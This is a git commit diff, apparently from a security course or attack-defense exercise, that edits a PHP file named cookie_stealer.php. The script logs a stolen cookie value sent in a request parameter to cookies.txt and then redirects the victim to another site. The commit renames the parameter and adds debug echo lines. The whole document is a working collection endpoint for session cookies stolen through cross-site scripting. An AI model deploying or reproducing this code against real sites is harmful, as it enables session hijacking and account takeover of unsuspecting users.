3c023515900695625547329f8239add9de54f962
Nikolas Iliopoulos <nikolasil2000@gmail.com>
2022-05-09 21:52:11 +0300

    cookie stealer

--- puppies/cookie_stealer.php
+++ puppies/cookie_stealer.php
@@ -1,9 +1,10 @@
 <?php
 
-if (isset($_REQUEST["c"])) {
+if (isset($_REQUEST["cookie"])) {
+  echo '1' + $_REQUEST["cookie"];
   $fp = fopen("cookies.txt", "a+");
-  fwrite($fp, $_REQUEST["c"] . "\n");
+  fwrite($fp, $_REQUEST["cookie"] . "\n");
   fclose($fp);
 }
-
+echo '2';
 header("Location: http://kerberosclan.csec.chatzi.org/");
